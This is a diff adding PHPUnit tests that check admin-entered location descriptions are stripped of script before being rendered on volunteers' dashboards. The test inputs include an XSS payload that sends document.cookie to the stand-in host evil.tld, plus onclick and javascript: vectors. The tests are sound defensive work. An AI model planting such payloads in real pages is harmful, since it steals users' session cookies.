@@ -136,6 +136,82 @@ class LocationsAndShiftsTest extends TestCase
         $this->assertDatabaseCount('locations', 1);
     }
 
+    public function test_a_description_posted_with_script_is_stored_sanitised(): void
+    {
+        $admin = User::factory()->adminRoleUser()->create(['is_enabled' => true]);
+
+        // The rich-text editor is a UI, not a boundary — an admin can post
+        // whatever they like straight at this endpoint, and the description is
+        // rendered with v-html on every volunteer's dashboard.
+        $this->actingAs($admin)
+            ->postJson('/admin/locations', [
+                'name' => 'A test city',
+                'description' => '<p>Meet here</p><script>fetch("//evil.tld?c="+document.cookie)</script>',
+                'min_volunteers' => 2,
+                'max_volunteers' => 3,
+                'requires_brother' => true,
+                'is_enabled' => true,
+                'shifts' => [],
+            ]);
+
+        $description = Location::first()->description;
+
+        $this->assertStringNotContainsString('script', $description);
+        $this->assertStringNotContainsString('document.cookie', $description);
+        // Sanitised, not rejected: the admin's actual prose survives.
+        $this->assertStringContainsString('Meet here', $description);
+    }
+
+    public function test_an_edited_description_is_sanitised_too(): void
+    {
+        $admin = User::factory()->adminRoleUser()->create(['is_enabled' => true]);
+        $location = Location::factory()->create(['description' => '<p>Original</p>']);
+
+        $this->actingAs($admin)
+            ->putJson("/admin/locations/$location->id", [
+                'name' => $location->name,
+                'description' => '<p onclick="alert(1)">Updated</p><a href="javascript:alert(1)">Link</a>',
+                'min_volunteers' => 1,
+                'max_volunteers' => 2,
+                'requires_brother' => false,
+                'is_enabled' => true,
+                'shifts' => [],
+            ]);
+
+        $description = $location->fresh()->description;
+
+        $this->assertStringNotContainsString('onclick', $description);
+        $this->assertStringNotContainsStringIgnoringCase('javascript:', $description);
+        $this->assertStringContainsString('Updated', $description);
+    }
+
+    public function test_a_description_using_the_editors_own_formatting_is_kept_intact(): void
+    {
+        $admin = User::factory()->adminRoleUser()->create(['is_enabled' => true]);
+
+        // Guards the other direction: an over-tight allowlist would quietly
+        // strip formatting an admin had already saved.
+        $formatted = '<h3>Parking</h3><p style="text-align: center"><strong>Rear</strong> entrance</p>'
+            .'<ul><li>Bring keys</li></ul><p><a href="https://example.org">Map</a></p>';
+
+        $this->actingAs($admin)
+            ->postJson('/admin/locations', [
+                'name' => 'A test city',
+                'description' => $formatted,
+                'min_volunteers' => 2,
+                'max_volunteers' => 3,
+                'requires_brother' => true,
+                'is_enabled' => true,
+                'shifts' => [],
+            ]);
+
+        $description = Location::first()->description;
+
+        foreach (['<h3>', '<strong>', '<ul>', '<li>', 'text-align', 'https://example.org'] as $expected) {
+            $this->assertStringContainsString($expected, $description);
+        }
+    }
+
     public function test_updating_a_location_cannot_rewrite_another_locations_shift(): void
     {
         $admin = User::factory()->adminRoleUser()->create(['is_enabled' => true]);
